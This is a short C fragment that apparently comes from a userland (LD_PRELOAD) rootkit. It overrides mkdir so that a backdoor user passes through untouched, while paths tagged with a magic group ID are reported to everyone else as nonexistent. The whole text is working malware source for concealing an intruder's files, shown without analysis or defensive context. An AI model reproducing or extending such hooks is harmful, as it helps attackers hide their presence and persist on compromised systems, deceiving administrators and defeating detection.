int mkdir(const char *pathname, mode_t mode)
{
    HOOK(o_mkdir, CMKDIR);
    if(is_bdusr()) return o_mkdir(pathname, mode);
    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return -1; }
    return o_mkdir(pathname, mode);  
}
